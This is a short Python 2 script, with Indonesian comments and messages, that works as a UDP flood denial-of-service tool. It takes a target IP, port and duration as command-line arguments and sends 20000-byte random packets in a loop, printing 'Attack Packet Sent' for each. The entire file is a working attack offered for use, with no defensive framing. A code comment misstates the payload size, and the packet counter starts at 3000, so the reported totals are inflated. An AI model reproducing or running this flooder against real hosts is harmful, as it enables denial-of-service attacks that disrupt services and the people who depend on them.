#!/usr/python2
#dos_key


import time
import socket
import random
import sys
def usage():
    print ""
    print "\033[36;1m [*] \033[32;1mmemanggil ddos. . ."
    print ""
def flood(victim, vport, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 20000 representasi satu byte ke server
    bytes = random._urandom(20000)
    timeout =  time.time() + duration
    sent = 3000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "\033[1;92m[\033[1;91mAttack\033[1;92m] \033[1;37mPacket Sent \033[1;32m%s \033[1;97mTarget Address \033[1;35m%s \033[1;93mon port \033[1;35m%s "%(sent, victim, vport)
def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()
